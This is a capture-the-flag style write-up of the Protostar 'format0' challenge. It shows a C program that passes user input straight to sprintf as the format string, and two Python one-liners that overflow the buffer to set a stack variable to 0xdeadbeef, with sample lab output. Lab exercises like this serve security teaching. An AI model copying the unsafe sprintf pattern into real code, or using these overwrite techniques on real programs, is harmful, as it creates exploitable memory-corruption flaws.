Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

This looks like a buffer overflow problem.

Type the following: `python -c "print 'a'*64+'\xef\xbe\xad\xde'" | xargs ./format0`

Sample output:
```bash
user@protostar:/opt/protostar/bin$ python -c "print 'a'*64+'\xef\xbe\xad\xde'" | xargs ./format0
you have hit the target correctly :)
```

Method 2 (preferred):

Type the following: `python -c "print '%64x\xef\xbe\xad\xde'" | xargs ./format0`

Sample output:
```bash
user@protostar:/opt/protostar/bin$ python -c "print '%64x\xef\xbe\xad\xde'" | xargs ./format0
you have hit the target correctly :)
```
